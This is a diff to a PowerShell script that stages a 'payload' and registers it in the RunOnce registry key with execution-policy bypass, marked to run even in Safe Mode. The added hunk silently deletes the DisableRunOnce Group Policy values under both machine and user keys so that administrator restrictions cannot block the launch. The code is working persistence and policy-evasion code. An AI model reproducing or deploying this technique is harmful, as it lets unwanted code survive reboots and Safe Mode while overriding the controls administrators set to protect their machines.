@@ -82,6 +82,19 @@ Write-Host "[PASS] PAYLOAD STAGED: $StagingPath" -ForegroundColor Green
 
 # 5. REGISTRY INJECTION (SAFE MODE VECTOR)
 Write-Host "[INFO] INJECTING RUNONCE TRIGGER..." -ForegroundColor Gray
+
+# 5.1 GPO NEUTRALIZATION (Prevent "Disable RunOnce" Policy)
+$GpoKeys = @(
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer",
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+)
+foreach ($Key in $GpoKeys) {
+    if (Test-Path $Key) {
+        Remove-ItemProperty -Path $Key -Name "DisableRunOnce" -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path $Key -Name "DisableLocalMachineRunOnce" -ErrorAction SilentlyContinue
+    }
+}
+
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
 $Command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Maximized -File $StagingPath"
 # Asterisk (*) forces execution in Safe Mode
